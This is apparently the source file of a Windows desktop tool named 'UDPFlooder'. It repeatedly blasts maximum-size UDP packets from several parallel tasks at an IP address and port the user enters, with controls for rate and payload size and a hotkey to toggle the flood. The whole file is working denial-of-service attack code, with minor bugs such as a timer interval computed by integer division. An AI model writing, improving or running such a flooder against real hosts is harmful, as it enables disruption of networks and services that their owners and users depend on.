using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using System.Net.Sockets;
using System.Net;
using System.Text;

namespace UDPFlooder
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private bool isOn;
        private int currentValue = 100;
        private int packetCount = 0;
        private int packCount = 1;
        private string ip = "27.27.27.27";
        private int port = 80;
        private int maxPayloadSize = 1472;
        DispatcherTimer timer;
        public MainWindow()
        {
            timer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(currentValue / 1000) };
            timer.Tick += dispatcherTimer_Tick;
            InitializeComponent();
            InitializeHotKey(); 
            timer.Start();
        }

        private void dispatcherTimer_Tick(object sender, EventArgs e)
        {
            if (!isOn) { return; }

            var tasks = new List<Task>();

            for (int i = 0; i < 5; i++)
            {
                int taskNumber = i; // Capture the loop variable for use inside the task
                tasks.Add(Task.Run(() =>
                {
                    try
                    {
                        Console.WriteLine($"Task {taskNumber} started.");
                        SendMultipleUdpPackets(ip, port); // Send 5 packets per task
                        Console.WriteLine($"Task {taskNumber} finished.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Task {taskNumber} encountered an error: " + ex.Message);
                    }
                }));
            }

            Task.WhenAll(tasks).ContinueWith(t =>
            {
                Console.WriteLine("All tasks completed.");
            });
        }

        private void SendMultipleUdpPackets(string ipAddress, int port)
        {
            string message = new string('L', maxPayloadSize);

            using (UdpClient udpClient = new UdpClient())
            {
                IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ipAddress), port);
                byte[] sendBuffer = Encoding.UTF8.GetBytes(message);

                for (int i = 0; i < packCount; i++)
                {
                    try
                    {
                        udpClient.Send(sendBuffer, sendBuffer.Length, endPoint);
                        this.packetCount++;

                        UpdatePacketBox(this.packetCount);

                        Console.WriteLine("Largest packet sent successfully.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("An error occurred in SendUdpPacket: " + ex.Message);
                    }
                }
            }
        }

            private void UpdatePacketBox(int count)
            {
                if (packetBox.Dispatcher.CheckAccess())
                {
                    packetBox.Text = count.ToString();
                }
                else
                {
                    packetBox.Dispatcher.BeginInvoke(new Action(() =>
                    {
                        packetBox.Text = count.ToString();
                    }));
                }
            }

            private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            this.DragMove();
        }

        private void Close_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void Minimize_Click(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void OnOffToggle_Click(object sender, RoutedEventArgs e)
        {
            isOn = OnOffToggle.IsChecked == true;
            OnOffToggle.Content = isOn ? "On" : "Off";
        }

        private void ValueSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            currentValue = (int)ValueSlider.Value;
            ValueTextBox.Text = currentValue.ToString();
        }
        

        private void ipBox_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            ip = ipBox.Text;
        }
        private void portBox_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            port = int.Parse(portBox.Text);
        }

        private void ValueTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            if (int.TryParse(ValueTextBox.Text, out int value))
            {
                currentValue = value;
                ValueSlider.Value = value;
                timer.Interval = TimeSpan.FromSeconds(currentValue / 1000);
            }
        }
        private void PacketTextBox_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            if (int.TryParse(PacketTextBox.Text, out int value))
            {
                if (value > 1472) {  value = 1472 ; }
                maxPayloadSize = value;
                if (PackSlider != null)
                {
                    PackSlider.Value = value;
                }
            }
        }
        
        private void PacketCount_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
        {
            if (int.TryParse(PacketCountTextBox.Text, out int value))
            {
                packetCount = value;
            }
        }

        private void PacketSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            maxPayloadSize = (int)PackSlider.Value;
            if (PacketTextBox != null)
            {
                PacketTextBox.Text = maxPayloadSize.ToString();
            }
        }

        private void InitializeHotKey()
        {
            var toggleHotKey = new HotKey(Key.F5, 0, OnToggleHotKeyPressed);
        }

        private void OnToggleHotKeyPressed(HotKey hotKey)
        {
            OnOffToggle.IsChecked = !OnOffToggle.IsChecked;
            OnOffToggle_Click(null, null);
        }
    }
}